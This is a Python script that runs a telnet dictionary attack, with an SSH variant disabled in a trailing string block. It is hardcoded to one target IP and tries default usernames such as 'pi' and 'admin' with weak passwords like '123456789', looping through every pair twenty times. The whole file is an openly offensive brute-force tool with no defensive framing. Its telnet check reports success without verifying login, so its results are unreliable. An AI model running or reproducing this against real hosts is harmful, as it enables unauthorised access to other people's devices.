import telnetlib
#from xmlrpc.client import Fault
import paramiko
from paramiko import SSHException, BadHostKeyException, AuthenticationException
from paramiko.ssh_exception import NoValidConnectionsError
import datetime

target_ip_address = ['157.82.207.245']
id_list = ['pi', 'admin', 'user', 'usr', 'default']
pass_list = ['qwerty', '123456789', 'password', 'password123',
             'pi', 'admin', 'user', 'usr', 'default']


def telnet_login(ip, id, password):
    try:
        tn = telnetlib.Telnet(ip, 23)
    except EOFError:
        print('cannot connect to the ip address')
        return False
    except ConnectionRefusedError:
        print('connection refused...')
        return False
    try:
        tn.read_until(b"login: ", timeout=10.0)
        tn.write(f"{id}\n".encode('utf-8'))
        print('user name trying')
    except EOFError:
        print('wrong id')
        return False
    try:
        tn.read_until(b"Password: ", timeout=10.0)
        tn.write(f"{password}\n".encode('utf-8'))
        print('password trying')
    except EOFError:
        print('wrong password')
        return False
    print('successfully connected')
    return True


def ssh_login(ip, id, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.WarningPolicy())
    try:
        client.connect(ip,
                       username=id,
                       password=password,
                       timeout=10.0)
    except (SSHException, BadHostKeyException, AuthenticationException, NoValidConnectionsError):
        #print('cannot connect to the host')
        return False
    print('successfully connected')
    return True

def main():
    result = []
    for i in range(20):
        for ip in target_ip_address:
            for id in id_list:
                for password in pass_list:
                    #print('trying telnet connect')
                    if telnet_login(ip, id, password):
                        result.append(['telnet', ip, id, password])
    return result


if __name__ == '__main__':
    #print(f"dictionary attack start time: {datetime.datetime.now()}")
    main()
    #print(f"dictionary attack finish time: {datetime.datetime.now()}")


'''
                    else:
                        if ssh_login(ip, id, password):
                            result.append(['ssh', ip, id, password])
'''